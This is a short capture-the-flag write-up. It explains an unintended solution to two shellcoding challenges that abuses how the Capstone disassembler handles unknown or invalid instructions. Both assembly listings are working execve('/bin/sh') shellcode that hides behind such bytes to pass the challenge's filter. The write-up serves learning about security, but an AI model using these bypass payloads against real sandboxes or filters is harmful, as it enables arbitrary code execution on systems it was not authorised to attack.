The actual specifics of the challenge do not really matter, I just want to discuss an unintended I found to solve both shellcoding challenges.

```c open
    int64_t var_138
    int64_t rax_6 = cs_disasm(var_130, &buf, sx.q(rax_1), _init, 0, &var_138)
    int64_t var_28 = 0
    
    if (rax_6 == 0)
        puts(str: "Error: Unable to disassemble sheâ€¦")
        cs_close(&var_130)
        exit(status: 1)
        noreturn
```

The challenge author (LMS) made the assumption that `cs_disasm` returns `NULL` if it fails to disassemble the provided bytes (e.g. it returns `NULL` when it encounters an invalid instruction). However this is not the case :D. The return value of `cs_disasm`, by default is the number of instructions it was able to successfully disassemble. Capstone does not actually care about invalid instructions and instead of returning an error simply stops disassembling once it reaches them.

We can exploit this by sending shellcode to the effect of:
```x86asm filename="solve.asm" open
    bits 64
    default rel
    global _start

_start:
    vzeroupper
    ; capstone does not know this instruction exists
    ; and believes it is invalid, however on real hardware
    ; rdsspq is effectively a nop
    rdsspq     rax
next:
    mov eax, 0x3b
    lea rdi, [shell]
    xor esi, esi
    xor edx, edx
    syscall

shell: db "/bin/sh", 0
```

The solve for shellwiz is slightly different but also abuses invalid instructions to bypass the challenge restrictions:
```x86asm filename="solve.asm" open
;;; solve for shellwiz
    jmp payload
invalid:
    ; invalid instruction in 64 bit mode
    db 0x06
payload:
    mov eax, 0x3b
    lea rdi, [shell]
    xor esi, esi
    xor edx, edx
    syscall
shell: db "/bin/sh", 0
```
